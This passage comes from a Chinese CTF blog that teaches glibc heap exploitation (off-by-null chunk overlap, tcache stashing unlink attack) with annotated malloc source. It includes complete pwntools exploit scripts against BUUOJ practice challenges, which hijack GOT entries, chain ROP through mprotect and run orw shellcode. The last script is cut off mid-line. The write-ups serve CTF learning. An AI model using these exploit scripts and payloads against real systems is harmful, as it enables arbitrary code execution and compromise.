class="line">add(0x18,&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure><p>将第一个堆块当做溢出堆块，然后去改变第二个指针堆块的size，将其size位改为0x41。</p><blockquote><p>为什么要改成0x41?</p><p>因为我们只能申请0x18和0x38两种大小的堆块，如果申请0x18那么得到的就是0x20大小的堆块，和指针堆块一样大，那还怎么堆块重叠呢？所以我们只能申请0x38大小的堆块，得到的是0x40大小的堆块，我们将第二个指针堆块的size位改为0x41之后，再申请一个0x38大小的堆块，就会把原本指针堆块的位置申请回来(因为它的大小被伪造成了0x41)当做用户堆块，那么此时真正的指针堆块就和用户堆块造成了重叠(如下图)</p><p>PS:用户堆块我指的是自己申请的堆块，指针堆块是程序自己申请的那个堆块</p></blockquote><p><img src="../img/image-20221007205244060.png" alt="image-20221007205244060"></p><p>然后申请一个0x38大小的堆块，就造成了堆块重叠。然后思路就是往用户堆块写入数据，覆写指针堆块里的指针将其改完free函数的got表，然后进行泄露得到libc地址。然后再用edit函数覆写edit函数的got表为system的地址，最后释放掉一个存有/bin/sh字符串的堆块即可获取shell、。</p><h3 id="EXP-v2">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">     </span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400E9f)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x38</span>)+p64(free_got_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;free_addr&#x27;</span>)</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;free&#x27;,free_addr,libc)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x400D81)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007205307506.png" alt="image-20221007205307506"></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off_by_null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于tcache stashing unlink attack的学习总结</title>
      <link href="/posts/12414989.html"/>
      <url>/posts/12414989.html</url>
      
        <content type="html"><![CDATA[<h2 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h2><blockquote><p>介绍：在2.29的libc版本中，进行了unsorted bin的双向链表完整性检查。因此unsorted bin attack也就失效了，不过在libc2.29的版本中tcache stashing unlink attack却可以达到类似的效果(在一个任意地址写入一个libc地址)。</p><p>原理：在2.29的libc中，如果我们需要的chunk位于了small bin里面，当我们将chunk从small bin拿出来的时候，还会去检查当前small bin链上是否还有剩余堆块，如果有的话并且tcache bin的链上还有空余位置(<strong>tcache bin不能为空</strong>)，就会将剩余的那个堆块给链入到tcache bin中。<strong>而将small bin中的堆块链入到tcache bin中的时候没有进行双向链表完整性的检查，此时攻击那个即将链入tcache bin的堆块的bk指针，即可向任意地址写入一个libc地址。</strong></p><p>注意：上述有一个看似矛盾的地方，如果tcache bin不为空并且没有满，才会将small bin里的堆块给链进来，但是tcache bin不为空的话，正常情况下会直接从tcahce bin里取，并非去small bin里找。但是<strong>calloc函数有个特性，它不会从tcache bin里取堆块，因此该攻击必须要利用calloc函数才行</strong>。</p><p><strong>适用版本：目前适用于所有带tcache的glibc版本(2.26–2.36)</strong></p><p>使用前提：</p><ol><li>能使用calloc分配堆块</li><li>可以控制small bin中的bk指针</li><li>small bin中最少要有两个堆块</li></ol><p>攻击效果：在任意地址写一个Libc地址(main_arena+96)</p><p>利用思路：</p><ol><li>先进行libc地址以及堆地址的泄露(libc地址不是必须的，而堆地址是必须的，因为我们伪造bk指针的时候，不能破坏fd指针，需要获取堆地址，重新还原fd指针)</li><li>然后将tcache bin中只留6个堆块**(这样small bin链入tcache bin后，tcache bin就会直接装满，防止程序继续通过我们篡改的bk指针继续往下遍历)**</li><li>再做出至少两个位于small bin中的chunk(可以通过切割unsorted bin的方式，让剩余部分的堆块进入small bin或者当遍历unsorted bin的时候，会给堆块分类，让其小堆块进入small bin中)</li><li>利用溢出或UAF+edit等手段，篡改位于small bin中的倒数第二个堆块的bk指针为我们想要写入main_arena+96的地址 <strong>注意伪造bk的时候一定不能破坏fd指针</strong></li><li>最后我们申请一个位于small bin那条链对应size中的chunk，<strong>将small bin中的一个chunk申请出来，而small bin链中的另一个堆块则进入tcache bin，在链入tcache bin的期间触发了tcache stashing unlink attack。</strong></li></ol></blockquote><p>该漏洞处的源码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      <span class="comment">//victim就是要脱链的堆块，也就是small bin里的最后一个</span></span><br><span class="line">      <span class="comment">//这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span></span><br><span class="line">    <span class="comment">//如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个（高地址）chunk的prev_inuse位</span></span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//将victim脱链</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取size对应的tcache索引</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//如果tcache bin没有满</span></span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//如果small bin不为空,tc_victim为small bin中的最后一个堆块</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;<span class="comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span></span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//将tc_victim从small bin中脱链</span></span><br><span class="line">      bck-&gt;fd = bin;<span class="comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span></span><br><span class="line">      tcache_put (tc_victim, tc_idx);<span class="comment">//将tc_victim链入tc_idx这条链</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="相关题目">相关题目</h2><h3 id="buu-2020-新春红包题-3">buu[2020 新春红包题]3</h3><h4 id="保护策略：">保护策略：</h4><p><img src="../img/image-20221022100112620.png" alt="image-20221022100112620"></p><p><img src="../img/image-20221022100136657.png" alt="image-20221022100136657"></p><h4 id="漏洞分析：">漏洞分析：</h4><p><img src="../img/image-20221022100147699.png" alt="image-20221022100147699"></p><p>存在一个UAF漏洞</p><p>存在一个可以溢出的函数(如下)</p><p><img src="../img/image-20221022100158891.png" alt="image-20221022100158891"></p><p>这里可以直接溢出buf打一个栈迁移，迁移到堆上(提前布置一个rop链)，执行orw来绕过沙箱。</p><h4 id="利用思路：">利用思路：</h4><p>虽然有UAF漏洞并且有edit函数和show函数，但这题没法打tcache poisoning，因为这题申请内存的函数是calloc，这个函数的特性是不从tcache bin中取堆块，因此我们打tcache poisoning也无法从tcache bin链上取出来堆块。而且就算能取出来堆块，也无法绕过沙箱。想绕沙箱就必须去利用那个溢出函数。</p><p>溢出函数中存在一个if检查，这里本来用unsorted bin attack的话是很好过检查的，但是在Libc为2.29的版本中对unsorted bin增加了检验双向链表完整性，无法去利用unsorted bin attack 了。不过在2.29有一种手法可以代替unsorted bin attack达到类似的效果，也就是tcache stashing unlink attack(上文对tcache stashing unlink attack做了介绍，这里就不再赘述了)</p><h4 id="泄露地址：">泄露地址：</h4><p>因为存在UAF漏洞，配合show函数，可以轻松的泄露堆地址和libc地址。但是为了后续的利用，我们前期需要先伪造两条不同的tcache链(一条用于后续small bin中堆块的链入，一条用于让堆块进入unsorted bin，因为0x410这条链装满了，再释放掉0x410的堆块就会直接进入unsorted bin) 如下图，我们执行两次show函数即可获取libc地址和堆地址。</p><p><img src="../img/image-20221022100217107.png" alt="image-20221022100217107"></p><h4 id="放入small-bin中两个堆块">放入small bin中两个堆块</h4><p>目前我们在unsorted bin中有一个0x410的堆块，我们先去申请一个0x300的堆块，这样剩下的0x100就会进入unsorted bin中，然后下一次申请0x400的堆块，ptmalloc就会去遍历unsorted bin将原先0x100的堆块放入small bin中。接着如法炮制再申请一个0x400的堆块，释放掉进入unsorted bin，然后申请0x300堆块，将unsorted bin中的堆块进行切割，残留的0x100堆块返回unsorted bin,最后再申请一个不等于0x100的堆块(如果正好相等的话，就直接从unsorted bin里拿出来了，只有不相等才会去遍历，然后给chunk分类)，这时候就又把0x100的堆块放入到了small bin里，而此时small bin中就有两个堆块了。</p><h4 id="篡改small-bin中的bk指针">篡改small bin中的bk指针</h4><p>因为这道题要触发后门的话，就得让下面这个if成立，我们直接篡改small bin的bk指针为这个qword_4058+2048-0x10的值即可</p><p><img src="../img/image-20221022100228422.png" alt="image-20221022100228422"></p><p>篡改后small bin的情况如下</p><p><img src="../img/image-20221022100244186.png" alt="image-20221022100244186"></p><p>最后再申请一个0xf0的堆块即可触发tcache stashing unlink attack。</p><p>完事了利用后门，打一个栈迁移，迁移执行流到堆上，执行提前布置好的rop链执行orw即可。我是直接调用了mprotect函数让堆去变成可读可写可执行，然后直接执行orw的shellcode(这里没有难点，就不再具体阐述了)</p><h4 id="EXP">EXP:</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_e=<span class="number">0x19A2</span></span><br><span class="line">d_d=<span class="number">0x1991</span></span><br><span class="line">d_a=<span class="number">0x196E</span></span><br><span class="line">d_s=<span class="number">0x19B3</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25200&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/zikh/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node4.buuoj.cn&quot;,25200)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i,<span class="number">2</span>,<span class="string">&#x27;wow&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#prevent merge with top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e4ca0</span><span class="comment">#recv_libc()-0x1e4ca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">rop+=p64(libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc_base)</span><br><span class="line">rop+=p64(leak_heap+<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x00\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=shellcode</span><br><span class="line">add(<span class="number">12</span>,<span class="number">4</span>,rop)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_e,d_s,d_d,<span class="number">0x143C</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target_addr=leak_heap-<span class="number">0x2270</span></span><br><span class="line">log_addr(<span class="string">&#x27;target_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(leak_heap+<span class="number">0xb20</span>)+p64(target_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(leak_heap+<span class="number">0x1370</span>-<span class="number">8</span>)+p64(<span class="number">0x0000000000058373</span>+libc_base)</span><br><span class="line">p.sendafter(<span class="string">&quot;What do you want to say?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221022100258683.png" alt="image-20221022100258683"></p><h3 id="hitcon-ctf-2019-one-punch">hitcon_ctf_2019_one_punch</h3><h4 id="保护策略：-v2">保护策略：</h4><img src="../img/image-20221026213251795.png" alt="image-20221026213251795" style="zoom:50%;" /><img src="../img/image-20221026213527448.png" alt="image-20221026213527448" style="zoom:50%;" /><h4 id="大致思路：">大致思路：</h4><p>这道题考察的是tcache stashing unlink attack，不过由于本题开了沙箱，所以最后需要用orw获取flag。</p><p>程序给了个后门(可以调用malloc，篡改malloc_hook劫持执行流)，不过需要用tcache stashing unlink attack来触发这个后门，利用libc里的一个gadget(add rsp,0x48;ret)将其写到malloc_hook里，直接控制程序执行流。</p><p>利用那个gadget能控制执行流的原因是因为程序询问size的时候，输入到栈里的数据太大了。(如下)</p><p><img src="../img/image-20221026220856636.png" alt="image-20221026220856636"></p><h4 id="EXP：">EXP：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26802&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content*size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0xC388</span>))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_chain</span>():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base=recv_libc()-<span class="number">0x1e4ca0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> libc_base,leak_heap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_into_smallbin</span>():</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x1</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>).ljust(<span class="number">0x2f0</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#first get into small bin</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;f&#x27;</span>)<span class="comment">#prevent merged chunk</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x2f0</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;g&#x27;</span>)<span class="comment">#second get into small bin</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>(<span class="params">leak_heap,libc_base</span>):</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    add_rsp_ret=<span class="number">0x000000000008cfd6</span>+libc_base</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x210</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x2f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(leak_heap-<span class="number">0x560</span>)+p64(leak_heap-<span class="number">0x26f0</span>-<span class="number">0x10</span>-<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span 